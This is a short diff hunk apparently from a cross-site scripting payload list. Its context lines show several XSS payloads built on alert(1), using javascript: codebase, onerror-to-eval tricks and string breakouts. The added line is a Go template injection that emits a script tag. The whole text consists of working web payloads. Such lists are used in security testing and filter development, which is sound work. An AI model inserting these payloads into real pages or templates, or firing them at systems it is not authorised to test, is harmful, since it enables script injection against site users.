@@ -80,4 +80,4 @@ confirm?.(1)
 '-alert(1)-'
 <object data="# alert(1)" codebase=javascript://>
 <img/src/onerror=window.onerror=eval;http://ReferenceError.prototype.name=';alert\x281\x29;var\x20Uncaught//';z>
-
+{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}
